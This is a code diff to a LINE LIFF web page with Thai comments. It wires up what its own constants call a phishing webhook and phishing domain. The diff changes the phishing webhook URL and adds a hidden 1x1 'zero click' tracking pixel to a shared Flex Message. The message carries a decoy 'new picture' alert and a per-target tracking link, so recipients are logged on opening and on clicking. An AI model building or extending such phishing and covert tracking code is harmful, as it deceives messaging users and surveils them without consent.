@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwJHDmlfsLWuj-9y-bCiUCpgTcyjRQf5NqIWhM8M1DBKwArkCMwFuLSEcrLiOvUMoQTHg/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbx_I2m7FG8ooUBKyXvwCt1usxxFT3ORX8EDqNy3hXJsfKMKPFbWky5Zk0FWWy0wTTQU8A/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -819,8 +819,11 @@
                 
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
+                
+                // สร้าง URL สำหรับ Zero Click tracking (ใช้รูป 1x1 pixel สำหรับติดตามเมื่อเปิดดูข้อความ)
+                const zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}`;
 
-                // สร้างข้อความแชร์ (Flex Message)
+                // สร้างข้อความแชร์ (Flex Message) พร้อมระบบ Zero Click
                 const message = {
                     type: 'flex',
                     altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
@@ -828,25 +831,41 @@
                         type: 'bubble',
                         hero: { // รูปภาพหลักที่คลิกได้
                             type: 'image',
-                            url: imageUrl, // <-- REVERTED to direct image URL
+                            url: imageUrl,
                             size: 'full',
                             aspectRatio: '1:1',
                             aspectMode: 'cover',
                             action: { // ทำให้รูปภาพคลิกได้ -> ลิงก์ไปยัง index.html พร้อม tracking key
                                 type: 'uri',
-                                uri: clickTrackUrl // <-- REVERTED to use tracking key URL pointing to index.html
+                                uri: clickTrackUrl
                             }
+                        },
+                        // เพิ่ม footer สำหรับใส่ tracking pixel (1x1 pixel transparent)
+                        footer: {
+                            type: 'box',
+                            layout: 'vertical',
+                            contents: [
+                                {
+                                    type: 'image',
+                                    url: zeroClickTrackUrl,
+                                    size: '1px',
+                                    aspectRatio: '1:1',
+                                    aspectMode: 'cover'
+                                }
+                            ],
+                            spacing: 'none',
+                            margin: 'none',
+                            height: '1px'
                         }
-                        // Removed the entire footer block which contained the tracking pixel
                     }
                 };
 
-                console.log("Attempting to share Flex Message:", JSON.stringify(message, null, 2)); // Simplified log message
+                console.log("Attempting to share Flex Message:", JSON.stringify(message, null, 2));
 
                 if (liff.isApiAvailable('shareTargetPicker')) {
                     console.log("ShareTargetPicker is available. Calling now...");
                     const result = await liff.shareTargetPicker([message]);
-                    console.log("ShareTargetPicker result:", result); // Added log
+                    console.log("ShareTargetPicker result:", result);
 
                     if (result) {
                         showStatus('แชร์รูปภาพสำเร็จ', true);
@@ -855,10 +874,7 @@
                         try {
                             const saved = await saveTrackingCaseMapping(trackingKey, caseName);
                             if (!saved) {
-                                // แม้ fetch no-cors จะไม่คืน error แต่เราสามารถ log ได้ว่าการเรียกใช้เสร็จสิ้น
                                 console.log('เรียกใช้ saveTrackingCaseMapping เสร็จสิ้น (อาจมีข้อผิดพลาดฝั่ง Server หรือ CORS)');
-                                // อาจแสดงข้อความเตือนผู้ใช้ แต่ไม่ควรหยุดการทำงานหลัก
-                                // showStatus('อาจมีปัญหาในการบันทึก Tracking Key (ตรวจสอบ Log)', false);
                             } else {
                                 console.log('บันทึก Tracking Key Mapping สำเร็จ (ตามที่ Client รับรู้)');
                             }
@@ -877,8 +893,8 @@
                 }
                 
             } catch (error) {
-                console.error('Error in shareImage function:', error); // Enhanced log
-                showStatus('เกิดข้อผิดพลาดในการแชร์รูปภาพ: ' + (error.message || error), false); // Show error message or error object
+                console.error('Error in shareImage function:', error);
+                showStatus('เกิดข้อผิดพลาดในการแชร์รูปภาพ: ' + (error.message || error), false);
             }
         }
         
